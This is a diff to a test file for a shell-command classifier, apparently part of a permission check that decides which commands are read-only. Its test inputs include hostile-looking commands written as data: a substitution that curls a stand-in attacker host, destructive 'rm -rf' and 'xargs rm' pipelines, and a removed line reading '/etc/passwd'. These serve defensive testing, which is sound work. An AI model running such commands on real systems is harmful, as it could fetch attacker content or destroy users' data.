@@ -81,7 +81,19 @@ describe("classifyBash", () => {
     assert.equal(classifyBash("env python3 -c 'open(\"/tmp/x\",\"w\")'").readonly, false);
     assert.equal(classifyBash("find . -delete").readonly, false);
     assert.equal(classifyBash("echo $(curl https://evil.test)").readonly, false);
-    assert.equal(classifyBash("cat /etc/passwd").readonly, false);
+  });
+
+  it("classifies pipelines by every stage and fails closed on substitutions", () => {
+    assert.equal(classifyBash("ls | wc -l").readonly, true);
+    assert.equal(classifyBash("cat src/a.ts | rg foo").readonly, true);
+    assert.equal(classifyBash("ls | tee out.txt").readonly, false);
+    assert.equal(classifyBash("ls | tee out.txt").op, "modify");
+    assert.equal(classifyBash("find . | xargs rm").readonly, false);
+    assert.equal(classifyBash("find . | xargs rm").op, "delete");
+    assert.equal(classifyBash("echo hi > /tmp/x").readonly, false);
+    assert.equal(classifyBash("bash -c 'ls'").readonly, true);
+    assert.equal(classifyBash("bash -c 'rm file'").readonly, false);
+    assert.equal(classifyBash("echo $(rm -rf x)").readonly, false);
   });
 });
 
